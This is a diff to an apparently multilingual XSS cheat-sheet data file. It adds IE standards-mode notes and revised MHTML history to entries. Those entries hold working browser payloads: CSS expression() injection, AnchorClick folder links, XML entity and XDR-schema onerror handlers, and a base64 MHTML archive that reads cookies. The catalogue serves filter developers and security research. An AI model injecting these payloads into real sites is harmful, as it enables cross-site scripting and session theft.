@@ -1017,9 +1017,9 @@ var items =
         'data'       : '<style>p[foo=bar{}*{-o-link:\'%js_uri_alert%\'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>',
         'trigger'    : 'location=getComputedStyle(frames[1].document.body, null).OLink.slice(1, -1)',
         'description': {
-            'en' : 'Opera as well as other browsers allow to break out attribute selectors and other CSS constructs with {...} - opening the possibility for declaring new properties and assigning values - such as -o-link and -o-link-source. In this case those proprietary properties allow overlaying any selected element with a JavaScript URI link href. Note that as of Opera 11 -o-link only applies for <a> tags.',
+            'en' : 'Opera as well as other browsers allow to break out attribute selectors and other CSS constructs with {...} - opening the possibility for declaring new properties and assigning values - such as -o-link and -o-link-source. In this case those proprietary properties allow overlaying any selected element with a JavaScript URI link href. Note that as of Opera 11 -o-link only applies for <a> tags.\r\nOn IE selector is broken up to IE 7 standards mode.',
             'ja' : '',
-            'ru' : 'Opera, как и другие браузеры, допускают выход за пределы селектора и других CSS-конструкций с помощью {...}, что открывает возможность для декларирования новых свойств и их значений, создавая видимость продолжения селектора.',
+            'ru' : 'Opera, как и другие браузеры, допускают выход за пределы селектора и других CSS-конструкций с помощью {...}, что открывает возможность для декларирования новых свойств и их значений, создавая видимость продолжения селектора.\r\nВ IE селектор прерывается вплоть до режима стандартов IE 7.',
             'cs' : 'Opera, podobně jako další prohlížeče, umožňuje vložit do selektorů a dalších míst složené konstrukce s {...}, což umožňuje deklarovat nové vlastnosti a přiřadit jim hodnoty, jako -o-link a -o-link-source. V tomto případě tyto proprietární vlastnosti mohou přiřadit libovolnému HTML elementu odkaz, který obsahuje JavaScript URI',
             'de' : '',
             'tr' : 'Diğer browserlar gibi Opera\'da özellik seçicilerini ve {...} ile başlayan diğer CSS constructer\'larını kötü amaçta kullanmaya izin veriyor - yeni özellikler tanımlanması ve değer atanmasının olasılığınıda arttırıyor - ayrıca -o-link -o-link-source gibi özellik seçicilerinede. Bu atak vektöründe bu özellikler JavaScript URI link href\'i ile seçilen herhangi bir elementin üstüne yazmaya izin veriyor. '
@@ -1325,9 +1325,9 @@ var items =
         },
         'data'       : '<a style="behavior:url(#default#AnchorClick);" folder="%js_uri_alert%">XXX</a>',
         'description': {
-            'en' : 'Using the AnchorClick behavior allows to use the "folder" attribute as replacement for a "href" attribute on <A> elements.',
+            'en' : 'Using the AnchorClick behavior allows to use the "folder" attribute as replacement for a "href" attribute on <A> elements. This example works up to IE 8 standards mode.',
             'ja' : '',
-            'ru' : 'Использование поведения AnchorClick позволяет заменить в теге <A> атрибут href атрибутом folder, содержащим полезную нагрузку.',
+            'ru' : 'Использование поведения AnchorClick позволяет заменить в теге <A> атрибут href атрибутом folder, содержащим полезную нагрузку. Этот пример работает вплоть до режима стандартов IE 8.',
             'cs' : 'AnchorClick behavior dovoluje použít atribut folder místo href v tagu A',
             'de' : ''
         },
@@ -2539,9 +2539,9 @@ var items =
         },
         'data'       : '<// style=x:expression\\28%js_write%\\29>',
         'description': {
-            'en' : 'An unnamed closing tag can still contain style attributes on IE as the example shows. For extra obfuscation a bogus CSS property is being used to execute the JavaScript via expression() combined with CSS escapes.', 
+            'en' : 'An unnamed closing tag can still contain style attributes on IE as the example shows. For extra obfuscation a bogus CSS property is being used to execute the JavaScript via expression() combined with CSS escapes. This example works up to IE 7 standards mode.', 
             'ja' : '',
-            'ru' : 'В данном примере показано, как тег, имеющий синтаксис закрывающего, воспринимает стилевой атрибут.  Выполнение JavaScript произойдет в режиме совместимости, а также в режиме стандартов IE 7↓. Однако возможность распознавания стилевого атрибута в таком теге сохраняется вплоть до режима стандартов IE8. В строгом смысле данные теги нельзя рассматривать в качестве закрывающих. Это особый вид тегов для Internet Explorer, которые данный браузер в указанных режимах считает пользовательскими.',
+            'ru' : 'В данном примере показано, как тег, имеющий синтаксис закрывающего, воспринимает стилевой атрибут.  Выполнение JavaScript произойдет в режиме совместимости, а также в режиме стандартов IE 7↓. Однако возможность распознавания стилевого атрибута в таком теге сохраняется вплоть до режима стандартов IE8. В строгом смысле данные теги нельзя рассматривать в качестве закрывающих. Это особый вид тегов для Internet Explorer, которые данный браузер в указанных режимах считает пользовательскими. Пример работает вплоть до режима стандартов IE 7.',
             'cs' : 'Uzavírací tag bez uvedeného názvu tagu může v IE obsahovat atributy stylu, tak jak můžete vidět v uvedeném příkladu. Pro další zamlžení útoku je použíta falešná vlastnost CSS a metoda expression() kombinovaná s escapováním znaků.',
             'de' : ''
         },
@@ -2716,9 +2716,9 @@ var items =
             'raw'           : '<!ENTITY x "&#x3C;html:img&#x20;src=\'x\'&#x20;xmlns:html=\'http://www.w3.org/1999/xhtml\'&#x20;onerror=\'%js_alert%\'/&#x3E;">'
         },
         'description': {
-            'en' : 'IE will render doctype-provided entities in the "html" namespace as soon as a user defined XML stylesheet tag is present.',
+            'en' : 'IE will render doctype-provided entities in the "html" namespace as soon as a user defined XML stylesheet tag is present. The example works up to IE 8 standards mode.',
             'ja' : '',
-            'ru' : 'IE для отображения HTML-тегов требует обязательного наличия на xml-странице пользовательской таблицы стилей, а также объявления соответствующего пространства имен с префиксом "html".',
+            'ru' : 'IE для отображения HTML-тегов требует обязательного наличия на xml-странице пользовательской таблицы стилей, а также объявления соответствующего пространства имен с префиксом "html". Пример работает вплоть до режима стандартов IE 8.',
             'cs' : 'Internet Explorer bude renderovat doctype entity ve jmeném prostoru "html" ve chvíli, kdy je zobrazen uživatelem definovaný tag XML stysheet.',
             'de' : ''
         },
@@ -2748,9 +2748,9 @@ var items =
         },
         'data'       : '<?xml-stylesheet type="text/css"?><root style="x:expression(%js_write%)"/>',
         'description': {
-            'en' : 'IE supports the style attribute in xml-pages too. Thus JavaScript can be executed via expression() with any given tag.',
+            'en' : 'IE supports the style attribute in xml-pages too. Thus JavaScript can be executed via expression() with any given tag. The example works up to IE 7 standards mode.',
             'ja' : '',
-            'ru' : 'IE поддерживает стилевой атрибут на xml-страницах. Таким образом javascript может быть выполнен в любом теге.',
+            'ru' : 'IE поддерживает стилевой атрибут на xml-страницах. Таким образом javascript может быть выполнен в любом теге. Пример работает вплоть до режима стандартов IE 7.',
             'cs' : 'IE podporuje atribut styl na xml stránkách. JavaScript tak může být proveden pomocí metody expression() u daného tagu.',
             'de' : ''
         },
@@ -2787,9 +2787,9 @@ var items =
             'raw'           : '<?xml version="1.0"?>\n<Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data">\n<ElementType name="img">\n<AttributeType name="src" required="yes" default="x"/>\n<AttributeType name="onerror" required="yes" default="%js_alert%"/>\n<attribute type="src"/>\n<attribute type="onerror"/>\n</ElementType>\n</Schema>'
         },
         'description': {
-            'en' : 'The namespace "html" is automatically determined using XSL. Missing attributes for the <img> tag such as "onerror" are obtained from the XDR-schema - and will then execute JavaScript.',
+            'en' : 'The namespace "html" is automatically determined using XSL. Missing attributes for the <img> tag such as "onerror" are obtained from the XDR-schema - and will then execute JavaScript. The example works up to IE 8 standards mode.',
             'ja' : '',
-            'ru' : 'Пространство имен html автоматически определяется IE с помощью XSL-таблицы. Недостающие атрибуты для тега <img> заимствуются из XDR-схемы.',
+            'ru' : 'Пространство имен html автоматически определяется IE с помощью XSL-таблицы. Недостающие атрибуты для тега <img> заимствуются из XDR-схемы. Пример работает вплоть до режима стандартов IE 8.',
             'cs' : 'Užitím XSL je automaticky určen jmenný prostor "html". Chybějící atributy v tagu <img> jako "onerror" jsou získány z XDR-schama a následně spustí kód JavaScriptu.',
             'de' : ''
         },
@@ -3407,13 +3407,13 @@ var items =
             'raw'           : '<html>\n<body>\n<b>some content without two new line \\n\\n</b>\nContent-Type: multipart/related; boundary="******"<b>some content without two new line</b>\n--******\nContent-Location: xss.html\nContent-Transfer-Encoding: base64\n\nPGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1\ncmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9\ndXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy\nYW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg\n--******--\n</body>\n</html>'
         },
         'description': {
-	    'en' : 'Any content including images (for example GIF comments) may be considered as web-archive in case user input is allowed before the first two new lines. Using this vector all sites that do not contain two new lines in the source code and allows users to insert new line are vulnerable - as well as all sites that allow users to upload images without post-upload conversion etc. A link to this web-archives can be specified via <IFRAME> or location.href and comparable.',
+            'en' : 'This example used the ability to convert the file with any conent type into a web archive using mhtml URI scheme to run JavaScript. For the first time this feature was discovered by Stepanishchev E. in 2006 and became known among web developers as an alternative to data URI for IE6-7. In 2007, Hasegawa Y. independently proposed a way to use this mhtml feature for XSS. Followed fix was incomplete because it doesn\'t take into account the possibility of addressing to the contents of the archive using "!value". This possibility as well as the possibility to access from the archive contents to a host domain are used in the example below.\r\n\r\nUsing this vector all sites that do not contain two new lines in the source code and allows users to insert new line were vulnerable - as well as all sites that allow users to upload images without post-upload conversion etc. A link to this web archives could be specified via <IFRAME> or location.href and comparable.\r\n\r\nThis example was published in June 2010, fix released in April 2011. The mhtml URI scheme doesn\'t determine the content type now, but archive contents still has access to the host domain.',
             'ja' : '',
-            'ru' : 'Любой формат, включая изображения, может рассматриваться в качестве веб-архива, если пользователь имеет возможность влиять на исходный код сайта до первых двух переводов строк. Этим вектором уязвимы все сайты, которые не содержат пустых строк в исходном коде, обычно добавляемых для читабельности, и позволяют пользователю вставлять символы перевода строки, а также все сайты, которые позволяют пользователям загружать неконвертируемые изображения (пример веб-архива, встроенного в изображение, можно взять из папки attachments : изображение при этом остается действительным, с точки зрения IE) и т.п. Ссылка на архив может быть указана в теге <IFRAME> или с помощью location, или как-либо ещё.',
+            'ru' : 'Данный пример для запуска JavaScript использовал возможность превратить файл с любым типом содержимого в веб-архив, используя mhtml-схему доступа. Впервые эта особенность была открыта Степанищевым Е. в 2006 году и получила известность среди вебных разработчиков как альтернатива data URI для IE6-7. В 2007 Хасегава Й. независимо предложил способ использования этого свойства mhtml для целей XSS. Исправление, последовавшее за этим, было неполным, так как не учитывало возможности адресации к содержимому архива с помощью "!value". Эта возможность, а также возможность доступа из содержимого архива к домену, в который он внедрен, использована в нижеприведенном примере.\r\n\r\nТаким образом, были уязвимы все сайты, которые не содержат пустых строк в исходном коде, обычно добавляемых для читабельности, и позволяют пользователю вставлять символы перевода строки, а также все сайты, которые позволяют пользователям загружать неконвертируемые изображения (пример веб-архива, встроенного в изображение, можно взять из папки attachments : изображение при этом остается действительным, с точки зрения IE) и т.п. Ссылка на архив могла быть указана в теге <IFRAME> или с помощью location, или как-либо ещё.\r\n\r\nДанный пример был опубликован в июне 2010 г., исправление выпущено в апреле 2011 г. Теперь тип содержимого не детерминирован mhtml-схемой, содержание архива по-прежнему имеет доступ к хостовому домену.',
             'cs' : '',
             'de' : ''
         },
-        'urls'    : ['http://en.wikipedia.org/wiki/MHTML', 'http://bolknote.ru/2006/08/25/~314', 'http://openmya.hacker.jp/hasegawa/security/ms07-034.txt', 'http://www.microsoft.com/technet/security/advisory/2501696.mspx'],
+        'urls'    : ['http://en.wikipedia.org/wiki/MHTML', 'http://bolknote.ru/2006/08/24/~312/', 'http://openmya.hacker.jp/hasegawa/security/ms07-034.txt', 'http://www.microsoft.com/technet/security/advisory/2501696.mspx', 'http://technet.microsoft.com/security/bulletin/ms11-026'],
         'howtofix'   : {
             'en' : '',
             'ja' : '',
@@ -3422,7 +3422,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'internet explorer': ['5.0','6.0', '7.0', '8.0']
+            'internet explorer': ['5.0', '6.0', 'end', '7.0', 'end', '8.0', 'end']
         },
         'tags'       : ['xss', 'internet explorer', 'archive', 'mhtml'],
         'reporter'   : 'Bolk, LeverOne'
@@ -3951,9 +3951,9 @@ var items =
         'data'       : '<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>',     
         'trigger'    : 'document.getElementsByTagName("div")[0].style.color=="red"?pass():fail();', 
         'description': {
-            'en' : 'If any* part of the CSS-declaration (property or value) contains a left curly brace ({ - not as part of a string), the CSS declaration cannot be closed without using a matching right curly brace (}). In most browsers this feature can not be used to bypass filters - as they require to close the strings, functions and attributes inside blocks. IE nevertheless does not require to close function inside such blocks. It is important to take into account especially when filtered styles are inside the targeted tag\'s attribute.\n\n*There\'s another exception for IE (see the letters [a] and [b] of #60).',
+            'en' : 'If any* part of the CSS-declaration (property or value) contains a left curly brace ({ - not as part of a string), the CSS declaration cannot be closed without using a matching right curly brace (}). In most browsers this feature can not be used to bypass filters - as they require to close the strings, functions and attributes inside blocks. IE nevertheless does not require to close function inside such blocks. It is important to take into account especially when filtered styles are inside the targeted tag\'s attribute. The example works up to IE 7 standards mode.\n\n*There\'s another exception for IE (see the letters [a] and [b] of #60).',
             'ja' : '',
-            'ru' : 'Если какая-либо* часть CSS-декларации содержит левую фигурную скобку, не являющуюся частью строки, в этом случае CSS-декларация не может быть завершена без использования правой фигурной скобки (}). В большинстве браузеров данная особенность не может быть использована для обхода фильтрации, поскольку они требуют завершения всех строк, функций и атрибутов, открытых внутри блока. Напротив, IE не требует закрывать функцию внутри такого блока. Это нужно принимать во внимание при фильтрации стилей внутри атрибута тега, где с первого взгляда СSS-блоки не могли бы встретиться в принципе.\n\n*Это правило имеет исключение для IE (смотрите литеры [a] и [b] в #60).',
+            'ru' : 'Если какая-либо* часть CSS-декларации содержит левую фигурную скобку, не являющуюся частью строки, в этом случае CSS-декларация не может быть завершена без использования правой фигурной скобки (}). В большинстве браузеров данная особенность не может быть использована для обхода фильтрации, поскольку они требуют завершения всех строк, функций и атрибутов, открытых внутри блока. Напротив, IE не требует закрывать функцию внутри такого блока. Это нужно принимать во внимание при фильтрации стилей внутри атрибута тега, где с первого взгляда СSS-блоки не могли бы встретиться в принципе. Пример работает вплоть до режима стандартов IE 7.\n\n*Это правило имеет исключение для IE (смотрите литеры [a] и [b] в #60).',
             'cs' : 'Pokud některá část* deklarace CSS (vlastnost nebo hodnota) obsahuje levou složenou závorku ({ - není součástí řetězce), není možné deklaraci uzavřít bez odpovídající prvé složené závorky (}). Ve většině prohlížečů nemůže být tato funkce použita k obcházení filtrů, protože vyžadují uzavření řetězců, funkcí a atributů uvnitř bloku. Ovšem IE nevyžaduje uzavření funkce uvnitř těchto bloků. Během filtrování je důležité brát ohled na to, zda jsou celé zápisy stylu uvedeny uvnitř atributu cílového tagu.\n\n* Pro IE existují další vyjímky (viz. body [a] a [b] oddílu #60)',
             'de' : ''
         },
@@ -3984,9 +3984,9 @@ var items =
         'data'       : '<div id="x">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>',        
         'trigger'    : 'getComputedStyle(document.getElementsByTagName("div")[0], null).color=="red"?pass():fail();', 
         'description': {
-            'en' : 'According to established practice selectors are usually filtered less thoroughly by filtering software than other parts of CSS language constructs. This example shows how to leave a CSS-block open to get hands on a selector and inject code into a possibly less thoroughly filtered area.',
+            'en' : 'According to established practice selectors are usually filtered less thoroughly by filtering software than other parts of CSS language constructs. This example shows how to leave a CSS-block open to get hands on a selector and inject code into a possibly less thoroughly filtered area.\r\nOn IE this example works in IE 8-9 standards mode.',
             'ja' : '',
-            'ru' : 'Согласно устоявшейся практике, самой слабофильтруемой областью в фильтрах, основанных на различной фильтрации различных синтаксических групп таблиц стилей, является селектор. В примере показан способ не дать закрыть CSS-блок, добраться до селектора и внедрить код в недостаточно защищенной зоне.',
+            'ru' : 'Согласно устоявшейся практике, самой слабофильтруемой областью в фильтрах, основанных на различной фильтрации различных синтаксических групп таблиц стилей, является селектор. В примере показан способ не дать закрыть CSS-блок, добраться до селектора и внедрить код в недостаточно защищенной зоне.\r\nВ IE этот пример работает в режиме стандартов IE 8-9.',
             'cs' : 'Podle zavedené praxe jsou selektory obvykle filtrovány méně důkladně filtrovacím softwarem než jiné části CSS kódu. Tento příklad ukazuje, jak je možné opustit CSS blok k uvolnění rukou a vložit kód do možná méně důkladně filtrované části.',
             'de' : ''
         },
